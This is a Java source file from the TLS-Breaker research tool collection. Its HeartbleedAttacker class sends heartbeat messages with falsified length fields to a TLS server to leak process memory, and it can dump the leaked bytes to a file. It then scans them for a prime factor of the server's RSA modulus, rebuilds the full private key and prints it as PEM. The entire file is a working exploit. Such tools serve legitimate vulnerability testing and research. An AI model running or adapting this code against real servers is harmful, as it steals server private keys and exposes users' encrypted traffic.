/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.heartbleed.impl;

import static de.rub.nds.modifiablevariable.util.ArrayConverter.bytesToRawHexString;
import static de.rub.nds.tlsattacker.core.constants.ProtocolMessageType.HEARTBEAT;
import static de.rub.nds.tlsattacker.core.constants.ProtocolMessageType.UNKNOWN;
import static de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil.getAllReceivedMessages;
import static de.rub.nds.tlsbreaker.breakercommons.util.file.FileUtils.readHexStringContentFromFile;
import static java.math.BigInteger.ONE;
import static java.math.BigInteger.ZERO;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.core.certificate.PemUtil;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.connection.AliasedConnection;
import de.rub.nds.tlsattacker.core.constants.Bits;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.https.HttpsRequestMessage;
import de.rub.nds.tlsattacker.core.https.HttpsResponseMessage;
import de.rub.nds.tlsattacker.core.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.*;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.*;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.transport.ConnectionEndType;
import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.heartbleed.config.HeartbleedCommandConfig;
import de.rub.nds.util.ByteArrayUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.asn1.pkcs.RSAPrivateKey;

import java.io.ByteArrayOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the server responds with a valid heartbeat
 * message.
 */
public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();
    private final Config tlsConfig;

    /**
     * @param config
     * @param baseConfig
     */
    public HeartbleedAttacker(HeartbleedCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
        tlsConfig = getTlsConfig();
    }

    @Override
    public void executeAttack() {
        // throw new UnsupportedOperationException("Not implemented yet");
        if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to the Heartbleed attack");
            return;
        }

        if (config.getOutputDumpFileLocation() != null) {
            dumpDataToFile();
        } else if (config.getInputDumpFileLocation() != null) {
            searchPrivateKeyInDumpFile();
        } else {

            RSAPublicKey publicKey = getServerPublicKey();
            if (publicKey == null) {
                LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
                return;
            }
            RSAPrivateKey rsaPrivateKey = null;

            // for (int i = 0; i < config.getHeartbeatCount(); i = i + 50) {
            /*
             * Config tlsConfig = getTlsConfig(); WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
             * .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT); State state =
             * setTraceAndGetState(trace, tlsConfig); // TODO: Remove LOGGER.info("Trace Action count:" +
             * trace.getTlsActions().size()); try { WorkflowExecutor workflowExecutor =
             * WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
             * workflowExecutor.executeWorkflow(); } catch (WorkflowExecutionException ex) { LOGGER.info(
             * "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
             * LOGGER.debug(ex); }
             */

            List<ProtocolMessage> heartbeatMessages = getHeartbeatMessages();// WorkflowTraceUtil.getAllReceivedMessages(trace,
            // ProtocolMessageType.HEARTBEAT);
            // LOGGER.info("Received heartbeats count=" + heartbeatMessages.size());
            // TODO: Remove
            /*
             * try { // Paths.get(System.getProperty("user.dir"), "keyfile.log"); FileWriter fileWriter = new
             * FileWriter("HeartbleedDump.txt");
             *
             * for (ProtocolMessage message : heartbeatMessages) { HeartbeatMessage heartbeatMessage =
             * (HeartbeatMessage) message;
             * fileWriter.write(bytesToRawHexString(heartbeatMessage.getPayload().getOriginalValue()));
             * fileWriter.write(System.lineSeparator()); fileWriter.write(System.lineSeparator());
             * fileWriter.write(System.lineSeparator()); }
             *
             * fileWriter.close(); System.out.println("Successfully wrote to file."); } catch (IOException e) {
             * System.out.println("An error occurred: " + e.getMessage()); }
             */
            int count = 0;
            for (ProtocolMessage message : heartbeatMessages) {
                // HeartbeatMessage heartbeatMessage = (HeartbeatMessage) message;
                // LOGGER.info("payload length = " + heartbeatMessage.getPayloadLength().getValue());
                // LOGGER.info("payloadValue.size() = " + heartbeatMessage.getPayload().getOriginalValue().length);

                // LOGGER.info("payload originalValue = " + new
                // String(Hex.encodeHex(heartbeatMessage.getPayload().getOriginalValue())));

                // LOGGER.info("payload bytesToRawHexString() = " +
                // bytesToRawHexString(heartbeatMessage.getPayload().getOriginalValue())); // state.getTlsContext().g

                // LOGGER.info("public key - modulus: " + publicKey.getModulus());
                // LOGGER.info("public key - modulus - (bitLength): " + publicKey.getModulus().bitLength());
                // LOGGER.info("public key - modulus - (bitCount): " + publicKey.getModulus().bitCount());
                // LOGGER.info("public key - exponent: " + publicKey.getPublicExponent());
                // LOGGER.info("public key - exponent - (bitLength): " + publicKey.getPublicExponent().bitLength());
                // LOGGER.info("public key - exponent - (bitCount): " + publicKey.getPublicExponent().bitCount());

                // prime size would be half of modulus bit length(2048). So, prime size = 1024 bit length = 128byte
                count++;
                // privateKey = findPrivateKey(heartbeatMessage.getPayload().getOriginalValue(), publicKey, count);
                rsaPrivateKey =
                    findPrivateKey(message.getCompleteResultingMessage().getOriginalValue(), publicKey, count);
                if (rsaPrivateKey != null) {
                    break;
                }
            }
            /*
             * if (privateKey != null) { break; }
             */
            // }
            if (rsaPrivateKey != null) {
                displayPrivateKey(rsaPrivateKey);
            } else {
                LOGGER.info("Private key could not be found.");
            }

        }
    }

    private void dumpDataToFile() {

        List<ProtocolMessage> heartbeatMessages = getHeartbeatMessages();

        // FileWriter fileWriter = null;
        try (FileWriter fileWriter = new FileWriter(config.getOutputDumpFileLocation())) {
            // fileWriter = new FileWriter(config.getOutputDumpFileLocation());
            // int count = 0;
            for (ProtocolMessage message : heartbeatMessages) {
                // HeartbeatMessage heartbeatMessage = (HeartbeatMessage) message;
                // count++;
                // System.out.println("Message: " + message);
                // fileWriter.write("********Heartbeat " + count);
                // fileWriter.write(System.lineSeparator() + "********contentType: " + ((TlsMessage)
                // message).getProtocolMessageType());
                fileWriter.write(bytesToRawHexString(message.getCompleteResultingMessage().getOriginalValue()));
                // fileWriter.write(bytesToRawHexString(heartbeatMessage.getPayload().getOriginalValue()));
                fileWriter.write(System.lineSeparator());
            }
            // fileWriter.close();
        } catch (IOException e) {
            LOGGER.error(e);
        }
        LOGGER.info("Data successfully written to file '" + config.getOutputDumpFileLocation() + "'.");

        /*
         * for (ProtocolMessage message : heartbeatMessages) { HeartbeatMessage heartbeatMessage = (HeartbeatMessage)
         * message; fileWriter.write(bytesToRawHexString(heartbeatMessage.getPayload().getOriginalValue())); }
         * fileWriter.close();
         */
    }

    private List<ProtocolMessage> getHeartbeatMessages() {
        Config tlsConfig = getTlsConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
            RunningModeType.CLIENT);
        State state = setTraceAndGetState(trace, tlsConfig);
        // LOGGER.info("Trace Action count:" + trace.getTlsActions().size());
        try {
            WorkflowExecutor workflowExecutor =
                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info(
                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
            LOGGER.debug(ex);
        }
        // WorkflowTraceUtil.getAllReceivedRecords(trace, ProtocolMessageType.HEARTBEAT);
        List<ProtocolMessage> receivedMessage = new LinkedList<>();
        for (ProtocolMessage message : getAllReceivedMessages(trace)) {
            ProtocolMessageType type = ((TlsMessage) message).getProtocolMessageType();
            if (type == HEARTBEAT || type == UNKNOWN) {
                receivedMessage.add(message);
            }
        }

        // return getAllReceivedMessages(trace , ProtocolMessageType.HEARTBEAT );
        return receivedMessage;
    }

    private void searchPrivateKeyInDumpFile() {
        ArrayList<byte[]> fileContents = readHexStringContentFromFile(config.getInputDumpFileLocation());
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        RSAPrivateKey rsaPrivateKey = null;
        for (byte[] data : fileContents) {
            rsaPrivateKey = findPrivateKey(data, publicKey, 0);
            if (rsaPrivateKey != null) {
                break;
            }
        }

        if (rsaPrivateKey != null) {
            displayPrivateKey(rsaPrivateKey);
        } else {
            LOGGER.info("Private key could not be found.");
        }
    }

    private void displayPrivateKey(RSAPrivateKey rsaPrivateKey) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            PemUtil.writePrivateKey(rsaPrivateKey.getEncoded(), baos);
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }
        String encodedPrivateKey = new String(baos.toByteArray());
        encodedPrivateKey = encodedPrivateKey.replace("BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY");
        encodedPrivateKey = encodedPrivateKey.replace("END PRIVATE KEY", "END RSA PRIVATE KEY");

        LOGGER.info("Encoded private key: " + System.lineSeparator() + encodedPrivateKey);
        // LOGGER.info(System.lineSeparator() + encodedPrivateKey);
    }

    private RSAPrivateKey findPrivateKey(byte[] rawServerData, RSAPublicKey publicKey, int count) {
        String str = null;
        // byte[] rawServerData = heartbeatMessage.getPayload().getOriginalValue();
        BigInteger n = publicKey.getModulus();
        int primeSizeInBytes = (n.bitLength() / 2) / Bits.IN_A_BYTE;
        LOGGER.info("Size of prime in bytes = " + primeSizeInBytes);
        // loop through the memory in the chunks of prime size (128 bytes).
        for (int i = 0; i <= (rawServerData.length - primeSizeInBytes); i++) {
            byte[] chunk = ByteArrayUtils.slice(rawServerData, i, primeSizeInBytes);
            // LOGGER.info("heartbeat(" + count + ") chunk(" + i + ") size = " + chunk.length);
            // LOGGER.info("heartbeat(" + count + ") chunk(" + i + ") firstElement = " + chunk[0]);
            // LOGGER.info("heartbeat(" + count + ") chunk(" + i + ") lastElement = " + chunk[chunk.length - 1]);
            LOGGER.info("Processing  memory chunk = " + bytesToRawHexString(chunk));

            // TODO: Remove Testing
            /*
             * String hexChunk = bytesToRawHexString(chunk); String reverseHexChunk =
             * bytesToRawHexString(ArrayConverter.reverseByteOrder(chunk)); String primeString =
             * "6F96DD5B8EF32B4CB1A18AA1C893223756822DB3FB37758673BADDA1D4DD317906A2EB021AD3A35215080061118F98359FEC0D91CEC512380AF08B4633185F7B6613A781E252DF376B38CA6120B456970BBC47DF6A39EAD206EA443740AB7493750AC5D774B3D62762A8116FF21224A3F5907900E3EC90B434249E217B59DFF9";
             * if (hexChunk.equals(primeString) || reverseHexChunk.equals(primeString)) { LOGGER.info("chunk(" + i +
             * ")********************Prime hex string found"); System.exit(1); return new CustomRSAPrivateKey(n, new
             * BigInteger(primeString)); }
             */// TODO: ending of testing code

            BigInteger first = new BigInteger(1, new byte[] { chunk[0] });
            if (ZERO.equals(first.mod(BigInteger.valueOf(2)))) {
                LOGGER.debug("Skipping even number = " + chunk[0]);
                continue;
            }

            BigInteger last = new BigInteger(1, new byte[] { chunk[chunk.length - 1] });
            if (ZERO.equals(last)) {
                LOGGER.debug("Skipping number ending with zero =" + last);
                continue;
            }

            byte[] bigEndianRepresentation = ArrayConverter.reverseByteOrder(chunk);
            BigInteger p = new BigInteger(1, bigEndianRepresentation);
            // BigInteger p = new BigInteger(1, chunk);
            // LOGGER.info("chunk(" + i + ") p=" +p);
            if (p.equals(ONE)) {
                // LOGGER.error("Skipping 1 prime =" + p);
                continue;
            }
            if (p.equals(ZERO)) {
                // LOGGER.error("Skipping Zero p=" + p);
                continue;
            }
            if (ZERO.equals(n.mod(p))) {
                LOGGER.info("Prime found!");
                LOGGER.info("prime = " + p);
                // str = "PRIME FOUND!";
                return getPrivateKey(p, n, publicKey.getPublicExponent());
                // break;
            }
        }
        return null;
    }

    private RSAPrivateKey getPrivateKey(BigInteger p, BigInteger n, BigInteger e) {
        BigInteger q = n.divide(p);
        BigInteger pMinusOne = p.subtract(ONE);
        BigInteger qMinusOne = q.subtract(ONE);
        BigInteger phi = pMinusOne.multiply(qMinusOne);
        BigInteger d = e.modInverse(phi);
        LOGGER.info("Calculated values:");
        LOGGER.info("p = " + p);
        LOGGER.info("q = " + q);
        LOGGER.info("phi = " + phi);
        LOGGER.info("d = " + d);
        // RSAPrivateCrtKeyImpl();
        /*
         * KeyFactory keyFactory = null; PrivateKey privateKey = null; try { keyFactory = KeyFactory.getInstance("RSA");
         * privateKey = keyFactory.generatePrivate(new RSAPrivateKeySpec(n, d)); } catch (NoSuchAlgorithmException |
         * InvalidKeySpecException exception) { exception.printStackTrace(); }
         */
        RSAPrivateKey rsaPrivateKey =
            new RSAPrivateKey(n, e, d, p, q, d.mod(pMinusOne), d.mod(qMinusOne), q.modInverse(p));
        // rsaPrivateKey.getEncoded();
        /*
         * StringWriter sWrt = new StringWriter(); JcaPEMWriter pemWriter = new JcaPEMWriter(sWrt); try {
         * pemWriter.writeObject(rsaPrivateKey); pemWriter.close(); } catch (IOException ioException) {
         * ioException.printStackTrace(); } LOGGER.info(sWrt.toString());
         */

        // java.lang.Object.iaik.security.rsa.RSAPrivateKey.RSAPrivateKey rsaPrivateKey// = new RSAPrivateKey();

        // return new CustomRSAPrivateKey(n, d);
        return rsaPrivateKey;
    }

    /**
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = getTlsConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
            .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
        trace.addTlsAction(new SendDynamicClientKeyExchangeAction());
        trace.addTlsAction(new SendAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
        HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
        trace.addTlsAction(new SendAction(message));
        trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
        State state = new State(tlsConfig, trace);
        ModifiableByte heartbeatMessageType = new ModifiableByte();
        ModifiableInteger payloadLength = new ModifiableInteger();
        payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
        ModifiableByteArray payload = new ModifiableByteArray();
        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
        message.setHeartbeatMessageType(heartbeatMessageType);
        message.setPayload(payload);
        message.setPayloadLength(payloadLength);

        try {
            WorkflowExecutor workflowExecutor =
                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info(
                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
            LOGGER.debug(ex);
        }

        if (WorkflowTraceUtil.didReceiveMessage(HEARTBEAT, trace)) {
            LOGGER.info(
                "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
            return true;
        } else if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
            return null;
        } else {
            LOGGER.info(
                "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
            return false;
        }
    }

    private State setTraceAndGetState(WorkflowTrace trace, Config tlsConfig) {
        AliasedConnection connection = tlsConfig.getDefaultClientConnection();
        State state = null;
        // trace.addTlsAction(new ReceiveTillAction(new ServerHelloDoneMessage()));
        trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig),
            new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
        trace.addTlsAction(new GenericReceiveAction());
        /*
         * trace.addTlsAction(new SendDynamicClientKeyExchangeAction()); trace.addTlsAction(new SendAction(new
         * ChangeCipherSpecMessage(), new FinishedMessage())); trace.addTlsAction(new ReceiveAction(new
         * ChangeCipherSpecMessage(), new FinishedMessage()));
         */

        for (int i = 1; i <= config.getHeartbeatCount(); i++) {
            HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
            trace.addTlsAction(new SendAction(message));
            trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
            // state = new State(tlsConfig, trace);
            ModifiableByte heartbeatMessageType = new ModifiableByte();
            ModifiableInteger payloadLength = new ModifiableInteger();
            payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
            ModifiableByteArray payload = new ModifiableByteArray();
            payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
            message.setHeartbeatMessageType(heartbeatMessageType);
            message.setPayload(payload);
            message.setPayloadLength(payloadLength);
            // trace.addTlsAction(new ReceiveTillAction(new HeartbeatMessage()));

            if (i % 10 == 0) {
                // HTTP request
                MessageAction action = MessageActionFactory.createAction(tlsConfig, connection,
                    ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
                trace.addTlsAction(action);
                action = MessageActionFactory.createAction(tlsConfig, connection, ConnectionEndType.SERVER,
                    new HttpsResponseMessage(tlsConfig));
                trace.addTlsAction(action);
            }
        }

        state = new State(tlsConfig, trace);// State state = new State(tlsConfig, trace);

        return state;
    }

    public RSAPublicKey getServerPublicKey() {
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        /*
         * if (publicKey == null) { LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
         * return null; }
         */
        LOGGER.info("Fetched the following server public key: " + publicKey);
        return publicKey;
    }
}
